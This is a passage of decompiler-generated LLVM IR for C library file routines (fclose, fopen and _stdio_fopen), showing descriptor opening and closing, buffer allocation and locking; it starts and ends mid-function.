  %v0_804c878 = phi i32 [ %v5_804c860, %entry ], [ -1, %dec_label_pc_804c86c ]
  %v2_804c87c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804c87c, i32* @edi, align 4
  ret i32 %v0_804c878

; uselistorder directives
  uselistorder i32 %v5_804c860, { 1, 0, 2 }
  uselistorder i32 %v0_804c858, { 1, 0 }
  uselistorder label %dec_label_pc_804c878, { 1, 0 }
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v4_804c887 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804c887, i32* @esi, align 4
  %v1_804c88b = add i32 %v4_804c887, 52
  %v2_804c88b = inttoptr i32 %v1_804c88b to i32*
  %v3_804c88b = load i32, i32* %v2_804c88b, align 4
  store i32 %v3_804c88b, i32* @ebp, align 4
  %v1_804c88e = icmp eq i32 %v3_804c88b, 0
  %v1_804c890 = icmp eq i1 %v1_804c88e, false
  br i1 %v1_804c890, label %dec_label_pc_804c8b1, label %dec_label_pc_804c892

dec_label_pc_804c892:                             ; preds = %entry
  %v1_804c892 = add i32 %v4_804c887, 56
  store i32 %v1_804c892, i32* @ebx, align 4
  %v2_804c89c = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804c89c, i32* @eax, align 4
  %v2_804c8a1 = call i32 @__pthread_return_void(i32 %v2_804c89c, i32 134526427)
  %v0_804c8a6 = load i32, i32* @ebx, align 4
  %v1_804c8a9 = call i32 @__pthread_return_0(i32 %v0_804c8a6)
  store i32 %v1_804c8a9, i32* @eax, align 4
  %v0_804c8b3.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804c8b1

dec_label_pc_804c8b1:                             ; preds = %entry, %dec_label_pc_804c892
  %v0_804c8bb = phi i32 [ %v4_804c887, %entry ], [ %v0_804c8b3.pre, %dec_label_pc_804c892 ]
  store i32 0, i32* @edi, align 4
  %v1_804c8b3 = inttoptr i32 %v0_804c8bb to i8*
  %v2_804c8b3 = load i8, i8* %v1_804c8b3, align 1
  %v3_804c8b3 = and i8 %v2_804c8b3, 64
  %v4_804c8b3 = icmp eq i8 %v3_804c8b3, 0
  br i1 %v4_804c8b3, label %dec_label_pc_804c8b1.dec_label_pc_804c8c6_crit_edge, label %dec_label_pc_804c8b8

dec_label_pc_804c8b1.dec_label_pc_804c8c6_crit_edge: ; preds = %dec_label_pc_804c8b1
  br label %dec_label_pc_804c8c6

dec_label_pc_804c8b8:                             ; preds = %dec_label_pc_804c8b1
  %v1_804c8bc = inttoptr i32 %v0_804c8bb to i16*
  %v2_804c8bc = call i32 @fflush_unlocked(i16* %v1_804c8bc)
  store i32 %v2_804c8bc, i32* @edi, align 4
  %v0_804c8c9.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804c8c6

dec_label_pc_804c8c6:                             ; preds = %dec_label_pc_804c8b1.dec_label_pc_804c8c6_crit_edge, %dec_label_pc_804c8b8
  %v0_804c8c9 = phi i32 [ %v0_804c8bb, %dec_label_pc_804c8b1.dec_label_pc_804c8c6_crit_edge ], [ %v0_804c8c9.pre, %dec_label_pc_804c8b8 ]
  %v1_804c8c9 = add i32 %v0_804c8c9, 4
  %v2_804c8c9 = inttoptr i32 %v1_804c8c9 to i32*
  %v3_804c8c9 = load i32, i32* %v2_804c8c9, align 4
  %v1_804c8cc = call i32 @__libc_close(i32 %v3_804c8c9)
  store i32 %v1_804c8cc, i32* @eax, align 4
  %v2_804c8d4 = icmp slt i32 %v1_804c8cc, 0
  %v1_804c8d6 = icmp eq i1 %v2_804c8d4, false
  br i1 %v1_804c8d6, label %dec_label_pc_804c8db, label %dec_label_pc_804c8d8

dec_label_pc_804c8d8:                             ; preds = %dec_label_pc_804c8c6
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_804c8db

dec_label_pc_804c8db:                             ; preds = %dec_label_pc_804c8c6, %dec_label_pc_804c8d8
  %v0_804c8db = load i32, i32* @esi, align 4
  %v1_804c8db = add i32 %v0_804c8db, 4
  %v2_804c8db = inttoptr i32 %v1_804c8db to i32*
  store i32 -1, i32* %v2_804c8db, align 4
  %v2_804c8ed = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_804c8ed, i32* @ebx, align 4
  %v2_804c8f2 = call i32 @__pthread_return_void(i32 %v2_804c8ed, i32 134526427)
  %v1_804c8fe = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80521a8.98 to i32))
  %v0_804c903 = load i32, i32* @global_var_8052548.99, align 8
  %v1_804c908 = add i32 %v0_804c903, 1
  store i32 %v1_804c908, i32* @global_var_8052548.99, align 8
  store i32 ptrtoint (i32* @global_var_80521a8.98 to i32), i32* @eax, align 4
  %v2_804c913 = call i32 @__pthread_return_void(i32 %v2_804c8ed, i32 1)
  store i32 %v2_804c913, i32* @eax, align 4
  %v0_804c91b = load i32, i32* @esi, align 4
  %v1_804c91b = inttoptr i32 %v0_804c91b to i16*
  %v2_804c91b = load i16, i16* %v1_804c91b, align 2
  %v3_804c91b = and i16 %v2_804c91b, 24576
  store i16 %v3_804c91b, i16* %v1_804c91b, align 2
  %v0_804c920 = load i32, i32* @esi, align 4
  %v1_804c920 = inttoptr i32 %v0_804c920 to i16*
  %v2_804c920 = load i16, i16* %v1_804c920, align 2
  %v3_804c920 = or i16 %v2_804c920, 48
  store i16 %v3_804c920, i16* %v1_804c920, align 2
  br i1 %v1_804c890, label %dec_label_pc_804c939, label %dec_label_pc_804c928

dec_label_pc_804c928:                             ; preds = %dec_label_pc_804c8db
  %v2_804c92c = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804c92c, i32* @eax, align 4
  %v2_804c931 = call i32 @__pthread_return_void(i32 %v2_804c92c, i32 1)
  store i32 %v2_804c931, i32* @eax, align 4
  br label %dec_label_pc_804c939

dec_label_pc_804c939:                             ; preds = %dec_label_pc_804c8db, %dec_label_pc_804c928
  %v0_804c939 = load i32, i32* @esi, align 4
  %v1_804c939 = add i32 %v0_804c939, 1
  %v2_804c939 = inttoptr i32 %v1_804c939 to i8*
  %v3_804c939 = load i8, i8* %v2_804c939, align 1
  %v4_804c939 = and i8 %v3_804c939, 64
  %v5_804c939 = icmp eq i8 %v4_804c939, 0
  br i1 %v5_804c939, label %dec_label_pc_804c94d, label %dec_label_pc_804c93f

dec_label_pc_804c93f:                             ; preds = %dec_label_pc_804c939
  %v1_804c942 = add i32 %v0_804c939, 8
  %v2_804c942 = inttoptr i32 %v1_804c942 to i32*
  %v3_804c942 = load i32, i32* %v2_804c942, align 4
  %v1_804c945 = call i32 @free(i32 %v3_804c942)
  store i32 %v1_804c945, i32* @eax, align 4
  br label %dec_label_pc_804c94d

dec_label_pc_804c94d:                             ; preds = %dec_label_pc_804c939, %dec_label_pc_804c93f
  %v2_804c959 = call i32 @__pthread_return_void(i32 %v2_804c8ed, i32 134526427)
  %v1_804c965 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80521a8.98 to i32))
  store i32 ptrtoint (i32* @global_var_80521a8.98 to i32), i32* @eax, align 4
  %v0_804c96c = load i32, i32* @global_var_805254c.100, align 4
  %v1_804c96c = add i32 %v0_804c96c, 1
  store i32 %v1_804c96c, i32* @global_var_805254c.100, align 4
  %v2_804c975 = call i32 @__pthread_return_void(i32 %v2_804c8ed, i32 1)
  %v0_804c97a = call i32 @_stdio_openlist_dec_use()
  %v0_804c982 = load i32, i32* @edi, align 4
  ret i32 %v0_804c982

; uselistorder directives
  uselistorder i32 (i32)* @__libc_close, { 4, 3, 2, 1, 5, 0 }
  uselistorder label %dec_label_pc_804c94d, { 1, 0 }
  uselistorder label %dec_label_pc_804c939, { 1, 0 }
  uselistorder label %dec_label_pc_804c8db, { 1, 0 }
  uselistorder label %dec_label_pc_804c8c6, { 1, 0 }
  uselistorder label %dec_label_pc_804c8b1, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_804c99b = inttoptr i32 %arg2 to i8*
  %v5_804c99b = call i32 @_stdio_fopen(i32 %arg1, i8* %v4_804c99b, i32 0, i32 -1)
  ret i32 %v5_804c99b
}

define i32 @_stdio_fopen(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804c9a4 = load i32, i32* @ebp, align 4
  %v0_804c9a5 = load i32, i32* @edi, align 4
  %v0_804c9a6 = load i32, i32* @esi, align 4
  %v0_804c9a7 = load i32, i32* @ebx, align 4
  store i32 %v0_804c9a7, i32* %stack_var_-16, align 4
  %v4_804c9ab = ptrtoint i8* %arg2 to i32
  store i32 %v4_804c9ab, i32* @edx, align 4
  store i32 %arg1, i32* @esi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %v2_804c9bb = load i8, i8* %arg2, align 1
  %v3_804c9bb = zext i8 %v2_804c9bb to i32
  %v4_804c9bb = load i32, i32* @eax, align 4
  %v5_804c9bb = and i32 %v4_804c9bb, -256
  %v6_804c9bb = or i32 %v5_804c9bb, %v3_804c9bb
  store i32 %v6_804c9bb, i32* %eax.global-to-local, align 4
  %v10_804c9bd = icmp eq i8 %v2_804c9bb, 114
  br i1 %v10_804c9bd, label %dec_label_pc_804c9ff, label %dec_label_pc_804c9c1

dec_label_pc_804c9c1:                             ; preds = %entry
  store i32 577, i32* @ebx, align 4
  %v10_804c9c6 = icmp eq i8 %v2_804c9bb, 119
  br i1 %v10_804c9c6, label %dec_label_pc_804ca01, label %dec_label_pc_804c9ca

dec_label_pc_804c9ca:                             ; preds = %dec_label_pc_804c9c1
  store i32 1089, i32* @ebx, align 4
  %v10_804c9ce = icmp eq i8 %v2_804c9bb, 97
  br i1 %v10_804c9ce, label %dec_label_pc_804ca01, label %dec_label_pc_804c9d2

dec_label_pc_804c9d2:                             ; preds = %dec_label_pc_804ca7a, %dec_label_pc_804ca54, %dec_label_pc_804c9ca
  %v0_804c9d2 = load i32, i32* %stack_var_-16, align 4
  %v1_804c9d2 = call i32 @__errno_location(i32 %v0_804c9d2)
  store i32 %v1_804c9d2, i32* %eax.global-to-local, align 4
  %v0_804c9d7 = load i32, i32* @ebp, align 4
  %v1_804c9d7 = icmp eq i32 %v0_804c9d7, 0
  %v1_804c9d9 = inttoptr i32 %v1_804c9d2 to i32*
  store i32 22, i32* %v1_804c9d9, align 4
  br i1 %v1_804c9d7, label %dec_label_pc_804cbc7, label %dec_label_pc_804c9e5

dec_label_pc_804c9e5:                             ; preds = %dec_label_pc_804caa3, %dec_label_pc_804c9d2
  %v0_804c9e5 = load i32, i32* @ebp, align 4
  %v1_804c9e5 = add i32 %v0_804c9e5, 1
  %v2_804c9e5 = inttoptr i32 %v1_804c9e5 to i8*
  %v3_804c9e5 = load i8, i8* %v2_804c9e5, align 1
  %v4_804c9e5 = and i8 %v3_804c9e5, 32
  %v5_804c9e5 = icmp eq i8 %v4_804c9e5, 0
  br i1 %v5_804c9e5, label %dec_label_pc_804cbc7, label %dec_label_pc_804c9ef

dec_label_pc_804c9ef:                             ; preds = %dec_label_pc_804c9e5
  store i32 %v0_804c9e5, i32* %stack_var_-76, align 4
  %v1_804c9f3 = call i32 @free(i32 %v0_804c9e5)
  store i32 %v1_804c9f3, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_804cbc2

dec_label_pc_804c9ff:                             ; preds = %entry
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804ca01

dec_label_pc_804ca01:                             ; preds = %dec_label_pc_804c9ca, %dec_label_pc_804c9c1, %dec_label_pc_804c9ff
  %v0_804ca12 = phi i32 [ 1089, %dec_label_pc_804c9ca ], [ 577, %dec_label_pc_804c9c1 ], [ 1, %dec_label_pc_804c9ff ]
  %v1_804ca01 = add i32 %v4_804c9ab, 1
  store i32 %v1_804ca01, i32* %eax.global-to-local, align 4
  %v2_804ca04 = inttoptr i32 %v1_804ca01 to i8*
  %v3_804ca04 = load i8, i8* %v2_804ca04, align 1
  %v12_804ca04 = icmp eq i8 %v3_804ca04, 98
  br i1 %v12_804ca04, label %dec_label_pc_804ca0c, label %dec_label_pc_804ca0a

dec_label_pc_804ca0a:                             ; preds = %dec_label_pc_804ca01
  store i32 %v4_804c9ab, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ca0c

dec_label_pc_804ca0c:                             ; preds = %dec_label_pc_804ca01, %dec_label_pc_804ca0a
  %v0_804ca0c = phi i32 [ %v1_804ca01, %dec_label_pc_804ca01 ], [ %v4_804c9ab, %dec_label_pc_804ca0a ]
  %v1_804ca0c = add i32 %v0_804ca0c, 1
  %v2_804ca0c = inttoptr i32 %v1_804ca0c to i8*
  %v3_804ca0c = load i8, i8* %v2_804ca0c, align 1
  %v12_804ca0c = icmp eq i8 %v3_804ca0c, 43
  %v1_804ca10 = icmp eq i1 %v12_804ca0c, false
  br i1 %v1_804ca10, label %dec_label_pc_804ca1a, label %dec_label_pc_804ca12

dec_label_pc_804ca12:                             ; preds = %dec_label_pc_804ca0c
  store i32 %v0_804ca12, i32* %eax.global-to-local, align 4
  %v1_804ca17 = add nuw nsw i32 %v0_804ca12, 1
  store i32 %v1_804ca17, i32* @ebx, align 4
  br label %dec_label_pc_804ca1a

dec_label_pc_804ca1a:                             ; preds = %dec_label_pc_804ca0c, %dec_label_pc_804ca12
  %v1_804ca1a = icmp eq i32 %arg3, 0
  %v1_804ca1c = icmp eq i1 %v1_804ca1a, false
  br i1 %v1_804ca1c, label %dec_label_pc_804ca50, label %dec_label_pc_804ca1e

dec_label_pc_804ca1e:                             ; preds = %dec_label_pc_804ca1a
  store i32 80, i32* %stack_var_-76, align 4
  %v1_804ca23 = call i32 @malloc(i32 80)
  store i32 %v1_804ca23, i32* %eax.global-to-local, align 4
  store i32 %v1_804ca23, i32* @ebp, align 4
  %v2_804ca2d = icmp eq i32 %v1_804ca23, 0
  br i1 %v2_804ca2d, label %dec_label_pc_804cbc9, label %dec_label_pc_804ca35

dec_label_pc_804ca35:                             ; preds = %dec_label_pc_804ca1e
  %v2_804ca23 = inttoptr i32 %v1_804ca23 to i16*
  store i16 8192, i16* %v2_804ca23, align 2
  %v2_804ca3d = add i32 %v1_804ca23, 8
  %v3_804ca3d = inttoptr i32 %v2_804ca3d to i32*
  store i32 0, i32* %v3_804ca3d, align 4
  %v2_804ca44 = add i32 %v1_804ca23, 56
  store i32 %v2_804ca44, i32* %eax.global-to-local, align 4
  store i32 %v2_804ca44, i32* %stack_var_-76, align 4
  %v1_804ca48 = call i32 @__stdio_init_mutex(i32 %v2_804ca44)
  store i32 %v1_804ca48, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ca50

dec_label_pc_804ca50:                             ; preds = %dec_label_pc_804ca1a, %dec_label_pc_804ca35
  %v2_804ca50 = icmp slt i32 %arg4, 0
  br i1 %v2_804ca50, label %dec_label_pc_804ca9d, label %dec_label_pc_804ca54

dec_label_pc_804ca54:                             ; preds = %dec_label_pc_804ca50
  %v0_804ca54 = load i32, i32* @ebx, align 4
  %v0_804ca56 = load i32, i32* @esi, align 4
  %v1_804ca56 = add i32 %v0_804ca56, 1
  store i32 %v1_804ca56, i32* %eax.global-to-local, align 4
  %v1_804ca59 = and i32 %v0_804ca54, 32771
  store i32 %v1_804ca59, i32* %edx.global-to-local, align 4
  %v1_804ca5f = load i32, i32* @ebp, align 4
  %v2_804ca5f = add i32 %v1_804ca5f, 4
  %v3_804ca5f = inttoptr i32 %v2_804ca5f to i32*
  store i32 %arg4, i32* %v3_804ca5f, align 4
  %v0_804ca62 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ca62 = add i32 %v0_804ca62, 1
  store i32 %v1_804ca62, i32* @edx, align 4
  %v0_804ca63 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ca63 = and i32 %v0_804ca63, %v1_804ca62
  store i32 %v2_804ca63, i32* %eax.global-to-local, align 4
  %v12_804ca65 = icmp eq i32 %v2_804ca63, %v1_804ca62
  %v1_804ca67 = icmp eq i1 %v12_804ca65, false
  br i1 %v1_804ca67, label %dec_label_pc_804c9d2, label %dec_label_pc_804ca6d

dec_label_pc_804ca6d:                             ; preds = %dec_label_pc_804ca54
  %v0_804ca6d = load i32, i32* @esi, align 4
  %v1_804ca6f = and i32 %v0_804ca6d, 1024
  %v1_804ca71 = xor i32 %v1_804ca6f, 1024
  store i32 %v1_804ca71, i32* %eax.global-to-local, align 4
  %v1_804ca76 = load i32, i32* @ebx, align 4
  %v2_804ca76 = and i32 %v1_804ca76, %v1_804ca71
  %v3_804ca76 = icmp eq i32 %v2_804ca76, 0
  br i1 %v3_804ca76, label %dec_label_pc_804ca6d.dec_label_pc_804ca93_crit_edge, label %dec_label_pc_804ca7a

dec_label_pc_804ca6d.dec_label_pc_804ca93_crit_edge: ; preds = %dec_label_pc_804ca6d
  br label %dec_label_pc_804ca93

dec_label_pc_804ca7a:                             ; preds = %dec_label_pc_804ca6d
  store i32 %arg4, i32* %stack_var_-76, align 4
  %v3_804ca83 = call i32 @__libc_fcntl(i32 %arg4, i32 4, i32 1024)
  store i32 %v3_804ca83, i32* %eax.global-to-local, align 4
  %v1_804ca8b = icmp eq i32 %v3_804ca83, 0
  %v1_804ca8d = icmp eq i1 %v1_804ca8b, false
  br i1 %v1_804ca8d, label %dec_label_pc_804c9d2, label %dec_label_pc_804ca7a.dec_label_pc_804ca93_crit_edge

dec_label_pc_804ca7a.dec_label_pc_804ca93_crit_edge: ; preds = %dec_label_pc_804ca7a
  %v0_804ca93.pre = load i32, i32* @esi, align 4
  %v0_804ca99.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804ca93

dec_label_pc_804ca93:                             ; preds = %dec_label_pc_804ca6d.dec_label_pc_804ca93_crit_edge, %dec_label_pc_804ca7a.dec_label_pc_804ca93_crit_edge
  %v0_804ca99 = phi i32 [ %v1_804ca76, %dec_label_pc_804ca6d.dec_label_pc_804ca93_crit_edge ], [ %v0_804ca99.pre, %dec_label_pc_804ca7a.dec_label_pc_804ca93_crit_edge ]
  %v0_804ca93 = phi i32 [ %v0_804ca6d, %dec_label_pc_804ca6d.dec_label_pc_804ca93_crit_edge ], [ %v0_804ca93.pre, %dec_label_pc_804ca7a.dec_label_pc_804ca93_crit_edge ]
  %v1_804ca93 = and i32 %v0_804ca93, 32768
  %v2_804ca99 = or i32 %v1_804ca93, %v0_804ca99
  store i32 %v2_804ca99, i32* @ebx, align 4
  br label %dec_label_pc_804cabe

dec_label_pc_804ca9d:                             ; preds = %dec_label_pc_804ca50
  %v1_804ca9d = add i32 %arg4, 1
  %v8_804ca9d = icmp eq i32 %v1_804ca9d, 0
  store i32 %v1_804ca9d, i32* @edi, align 4
  %v0_804caa9.pre = load i32, i32* @ebx, align 4
  br i1 %v8_804ca9d, label %dec_label_pc_804caa3, label %dec_label_pc_804caa0

dec_label_pc_804caa0:                             ; preds = %dec_label_pc_804ca9d
  %v11_804caa0 = or i32 %v0_804caa9.pre, 32768
  store i32 %v11_804caa0, i32* @ebx, align 4
  br label %dec_label_pc_804caa3

dec_label_pc_804caa3:                             ; preds = %dec_label_pc_804ca9d, %dec_label_pc_804caa0
  %v0_804caa9 = phi i32 [ %v11_804caa0, %dec_label_pc_804caa0 ], [ %v0_804caa9.pre, %dec_label_pc_804ca9d ]
  %v0_804caaa = load i32, i32* @esi, align 4
  store i32 %v0_804caaa, i32* %stack_var_-76, align 4
  %v3_804caab = inttoptr i32 %v0_804caaa to i8*
  %v4_804caab = call i32 @__libc_open(i8* %v3_804caab, i32 %v0_804caa9, i32 438)
  store i32 %v4_804caab, i32* %eax.global-to-local, align 4
  %v1_804cab3 = load i32, i32* @ebp, align 4
  %v2_804cab3 = add i32 %v1_804cab3, 4
  %v3_804cab3 = inttoptr i32 %v2_804cab3 to i32*
  store i32 %v4_804caab, i32* %v3_804cab3, align 4
  %v2_804cab6 = icmp slt i32 %v4_804caab, 0
  br i1 %v2_804cab6, label %dec_label_pc_804c9e5, label %dec_label_pc_804cabe

dec_label_pc_804cabe:                             ; preds = %dec_label_pc_804caa3, %dec_label_pc_804ca93
  %v0_804cabe = load i32, i32* @ebp, align 4
  %v1_804cabe = inttoptr i32 %v0_804cabe to i16*
  %v2_804cabe = load i16, i16* %v1_804cabe, align 2
  %v3_804cabe = and i16 %v2_804cabe, 8192
  store i16 %v3_804cabe, i16* %v1_804cabe, align 2
  %v0_804cac4 = load i32, i32* @ebx, align 4
  %v8_804cac6 = and i32 %v0_804cac4, -31744
  %v1_804cacb = urem i32 %v0_804cac4, 4
  %v1_804cace = add nuw nsw i32 %v1_804cacb, 1
  store i32 %v1_804cace, i32* %eax.global-to-local, align 4
  %v1_804cacf = load i32, i32* @ebp, align 4
  %v2_804cacf = inttoptr i32 %v1_804cacf to i32*
  %v3_804cacf = load i32, i32* %v2_804cacf, align 4
  %v4_804cacf = or i32 %v3_804cacf, %v8_804cac6
  %v1_804cad2 = mul nuw nsw i32 %v1_804cace, 16
  %v2_804cad5 = xor i32 %v1_804cad2, 48
  store i32 %v2_804cad5, i32* %eax.global-to-local, align 4
  %v2_804cad8 = or i32 %v4_804cacf, %v2_804cad5
  store i32 %v2_804cad8, i32* @ebx, align 4
  %v1_804cada = trunc i32 %v2_804cad8 to i16
  %v3_804cada = inttoptr i32 %v1_804cacf to i16*
  store i16 %v1_804cada, i16* %v3_804cada, align 2
  %v0_804cade = load i32, i32* %stack_var_-76, align 4
  %v1_804cade = call i32 @__errno_location(i32 %v0_804cade)
  store i32 %v1_804cade, i32* %eax.global-to-local, align 4
  store i32 %v1_804cade, i32* @esi, align 4
  %v1_804cae8 = inttoptr i32 %v1_804cade to i32*
  %v2_804cae8 = load i32, i32* %v1_804cae8, align 4
  store i32 %v2_804cae8, i32* @edi, align 4
  %v0_804caea = load i32, i32* @ebp, align 4
  %v1_804caea = add i32 %v0_804caea, 4
  %v2_804caea = inttoptr i32 %v1_804caea to i32*
  %v3_804caea = load i32, i32* %v2_804caea, align 4
  store i32 %v3_804caea, i32* %stack_var_-76, align 4
  %v1_804caed = call i32 @isatty(i32 %v3_804caea)
  %v2_804caf5 = mul i32 %v1_804caed, 256
  store i32 %v2_804caf5, i32* %eax.global-to-local, align 4
  %v0_804caf8 = load i32, i32* @ebx, align 4
  %v2_804caf8 = or i32 %v0_804caf8, %v2_804caf5
  store i32 %v2_804caf8, i32* @ebx, align 4
  %v1_804cafa = trunc i32 %v2_804caf8 to i16
  %v2_804cafa = load i32, i32* @ebp, align 4
  %v3_804cafa = inttoptr i32 %v2_804cafa to i16*
  store i16 %v1_804cafa, i16* %v3_804cafa, align 2
  %v0_804cafe = load i32, i32* @edi, align 4
  %v1_804cafe = load i32, i32* @esi, align 4
  %v2_804cafe = inttoptr i32 %v1_804cafe to i32*
  store i32 %v0_804cafe, i32* %v2_804cafe, align 4
  %v0_804cb00 = load i32, i32* @ebp, align 4
  %v1_804cb00 = add i32 %v0_804cb00, 8
  %v2_804cb00 = inttoptr i32 %v1_804cb00 to i32*
  %v3_804cb00 = load i32, i32* %v2_804cb00, align 4
  %v4_804cb00 = icmp eq i32 %v3_804cb00, 0
  %v1_804cb04 = icmp eq i1 %v4_804cb00, false
  br i1 %v1_804cb04, label %dec_label_pc_804cb34, label %dec_label_pc_804cb06

dec_label_pc_804cb06:                             ; preds = %dec_label_pc_804cabe
  store i32 4096, i32* %stack_var_-76, align 4
  %v1_804cb0e = call i32 @malloc(i32 4096)
  store i32 %v1_804cb0e, i32* %eax.global-to-local, align 4
  %v1_804cb16 = load i32, i32* @ebp, align 4
  %v2_804cb16 = add i32 %v1_804cb16, 8
  %v3_804cb16 = inttoptr i32 %v2_804cb16 to i32*
  store i32 %v1_804cb0e, i32* %v3_804cb16, align 4
  %v1_804cb19 = icmp eq i32 %v1_804cb0e, 0
  %v0_804cb2d = load i32, i32* @ebp, align 4
  br i1 %v1_804cb19, label %dec_label_pc_804cb2d, label %dec_label_pc_804cb1d

dec_label_pc_804cb1d:                             ; preds = %dec_label_pc_804cb06
  %v1_804cb1d = inttoptr i32 %v0_804cb2d to i16*
  %v2_804cb1d = load i16, i16* %v1_804cb1d, align 2
  %v3_804cb1d = or i16 %v2_804cb1d, 16384
  store i16 %v3_804cb1d, i16* %v1_804cb1d, align 2
  %v1_804cb23 = add i32 %v1_804cb0e, 4096
  store i32 %v1_804cb23, i32* %eax.global-to-local, align 4
  %v1_804cb28 = load i32, i32* @ebp, align 4
  %v2_804cb28 = add i32 %v1_804cb28, 12
  %v3_804cb28 = inttoptr i32 %v2_804cb28 to i32*
  store i32 %v1_804cb23, i32* %v3_804cb28, align 4
  br label %dec_label_pc_804cb34

dec_label_pc_804cb2d:                             ; preds = %dec_label_pc_804cb06
  %v1_804cb2d = add i32 %v0_804cb2d, 12
  %v2_804cb2d = inttoptr i32 %v1_804cb2d to i32*
  store i32 0, i32* %v2_804cb2d, align 4
  br label %dec_label_pc_804cb34

dec_label_pc_804cb34:                             ; preds = %dec_label_pc_804cabe, %dec_label_pc_804cb1d, %dec_label_pc_804cb2d
  %v0_804cb34 = load i32, i32* @ebp, align 4
  %v1_804cb34 = add i32 %v0_804cb34, 8
  %v2_804cb34 = inttoptr i32 %v1_804cb34 to i32*
  %v3_804cb34 = load i32, i32* %v2_804cb34, align 4
  store i32 %v3_804cb34, i32* %eax.global-to-local, align 4
  %v1_804cb37 = add i32 %v0_804cb34, 2
  %v2_804cb37 = inttoptr i32 %v1_804cb37 to i8*
  store i8 0, i8* %v2_804cb37, align 1
  %v0_804cb3b = load i32, i32* %eax.global-to-local, align 4
  %v1_804cb3b = load i32, i32* @ebp, align 4
  %v2_804cb3b = add i32 %v1_804cb3b, 24
  %v3_804cb3b = inttoptr i32 %v2_804cb3b to i32*
  store i32 %v0_804cb3b, i32* %v3_804cb3b, align 4
  %v0_804cb3e = load i32, i32* %eax.global-to-local, align 4
  %v1_804cb3e = load i32, i32* @ebp, align 4
  %v2_804cb3e = add i32 %v1_804cb3e, 28
  %v3_804cb3e = inttoptr i32 %v2_804cb3e to i32*
  store i32 %v0_804cb3e, i32* %v3_804cb3e, align 4
  %v0_804cb41 = load i32, i32* %eax.global-to-local, align 4
  %v1_804cb41 = load i32, i32* @ebp, align 4
  %v2_804cb41 = add i32 %v1_804cb41, 16
  %v3_804cb41 = inttoptr i32 %v2_804cb41 to i32*
  store i32 %v0_804cb41, i32* %v3_804cb41, align 4
  %v0_804cb44 = load i32, i32* %eax.global-to-local, align 4
  %v1_804cb44 = load i32, i32* @ebp, align 4
  %v2_804cb44 = add i32 %v1_804cb44, 20
  %v3_804cb44 = inttoptr i32 %v2_804cb44 to i32*
  store i32 %v0_804cb44, i32* %v3_804cb44, align 4
  %v0_804cb47 = load i32, i32* @ebp, align 4
  %v1_804cb47 = add i32 %v0_804cb47, 44
  %v2_804cb47 = inttoptr i32 %v1_804cb47 to i32*
  store i32 0, i32* %v2_804cb47, align 4
  %v0_804cb4e = load i32, i32* @ebp, align 4
  %v1_804cb4e = add i32 %v0_804cb4e, 1
  %v2_804cb4e = inttoptr i32 %v1_804cb4e to i8*
  %v3_804cb4e = load i8, i8* %v2_804cb4e, align 1
  %v4_804cb4e = and i8 %v3_804cb4e, 32
  %v5_804cb4e = icmp eq i8 %v4_804cb4e, 0
  %v0_804cb52 = load i32, i32* @global_var_80521c0.101, align 64
  store i32 %v0_804cb52, i32* @eax, align 4
  %v2_804cb57 = add i32 %v0_804cb4e, 52
  %v3_804cb57 = inttoptr i32 %v2_804cb57 to i32*
  store i32 %v0_804cb52, i32* %v3_804cb57, align 4
  br i1 %v5_804cb4e, label %dec_label_pc_804cbc9, label %dec_label_pc_804cb5c

dec_label_pc_804cb5c:                             ; preds = %dec_label_pc_804cb34
  %v2_804cb67 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804cb67, i32* %stack_var_-76, align 4
  %v2_804cb6c = call i32 @__pthread_return_void(i32 %v2_804cb67, i32 134526427)
  store i32 %v2_804cb6c, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_80521a8.98 to i32), i32* %stack_var_-76, align 4
  %v1_804cb78 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80521a8.98 to i32))
  store i32 %v1_804cb78, i32* @eax, align 4
  %v2_804cb8a = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_804cb8a, i32* %stack_var_-76, align 4
  %v2_804cb8f = call i32 @__pthread_return_void(i32 %v2_804cb8a, i32 134526427)
  store i32 %v2_804cb8f, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8052190.102 to i32), i32* %stack_var_-76, align 4
  %v1_804cb9b = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8052190.102 to i32))
  %v0_804cba0 = load i32, i32* bitcast (i32** @global_var_805218c.104 to i32*), align 4
  store i32 %v0_804cba0, i32* @eax, align 4
  %v1_804cba5 = load i32, i32* @ebp, align 4
  %v2_804cba5 = add i32 %v1_804cba5, 32
  %v3_804cba5 = inttoptr i32 %v2_804cba5 to i32*
  store i32 %v0_804cba0, i32* %v3_804cba5, align 4
  %v0_804cba8 = load i32, i32* @ebp, align 4
  store i32 %v0_804cba8, i32* bitcast (i32** @global_var_805218c.104 to i32*), align 4
  %v2_804cbae = load i32, i32* %stack_var_-76, align 4
  store i32 %v2_804cbae, i32* @ecx, align 4
